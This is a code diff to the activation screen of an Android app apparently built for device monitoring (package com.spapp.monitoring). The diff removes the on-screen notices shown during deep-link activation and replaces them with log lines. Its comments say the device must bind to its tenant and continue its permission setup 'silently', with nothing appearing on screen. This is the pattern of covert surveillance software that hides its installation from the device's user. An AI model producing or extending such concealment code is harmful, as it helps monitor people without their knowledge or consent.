@@ -61,9 +61,10 @@ class ActivationActivity : AppCompatActivity() {
 
         val name = uri.getQueryParameter("name")?.trim()
         binding.inputDeviceCode.setText(token)
-        if (!name.isNullOrEmpty()) {
-            Toast.makeText(this, "Connecting as: $name", Toast.LENGTH_LONG).show()
-        }
+        // Stay silent on the auto path: the whole point of the link flow is
+        // that the device binds to its tenant without anything appearing on
+        // screen. The device name is logged instead of toasted.
+        Log.i("ActivationActivity", "Auto-binding via deep link, name=${name ?: "(none)"}")
         activate(token)
     }
 
@@ -121,11 +122,9 @@ class ActivationActivity : AppCompatActivity() {
                     com.spapp.monitoring.sync.SyncScheduler.schedule(applicationContext)
                     com.spapp.monitoring.sync.SyncScheduler.runOnce(applicationContext)
 
-                    Toast.makeText(
-                        this@ActivationActivity,
-                        getString(R.string.activation_success),
-                        Toast.LENGTH_SHORT
-                    ).show()
+                    // No success toast: the permission chain takes over
+                    // immediately and the screen must not show any popup.
+                    Log.i("ActivationActivity", "Activated device ${body.device.id} - continuing setup silently")
 
                     startActivity(Intent(this@ActivationActivity, MainActivity::class.java))
                     finish()
